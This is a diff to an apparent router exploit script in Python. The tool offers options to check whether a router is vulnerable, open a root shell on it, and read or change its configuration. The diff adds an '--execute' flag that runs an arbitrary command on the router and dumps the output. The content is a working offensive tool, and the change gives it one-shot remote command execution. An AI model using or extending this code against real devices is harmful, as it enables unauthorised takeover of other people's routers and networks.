@@ -12,6 +12,7 @@ parser.add_argument('--port', type=int, nargs='?', help='port to use', default=3
 command_group = parser.add_mutually_exclusive_group()
 command_group.add_argument('--is_vuln', help='tells you if the router is vulnerable or not (default)', action="store_true")
 command_group.add_argument('--shell', help='gives you a root shell on the router', action="store_true")
+command_group.add_argument('--execute', type=str, nargs='?', help='run a command and dump straight to stdout', default='')
 command_group.add_argument('--print_conf', help='pretty print router\'s configuration', action="store_true")
 command_group.add_argument('--get_var', type=str, nargs='?', metavar='var_name', help='get router\'s configuration variable')
 command_group.add_argument('--set_var', type=str, nargs='?', metavar='var_name=val', help='set router\'s configuration variable')
@@ -80,6 +81,8 @@ elif args.shell :
 	print(send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1])
 	while 1 :
 		print(send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1])
+elif len(args.execute) :
+	sys.stdout.write(send_message(s, endianness, 7, args.execute)[1])
 elif args.print_conf :
 	conf = send_message(s, endianness, 1)[1]
 	conf = conf.replace("\x00", "\n")
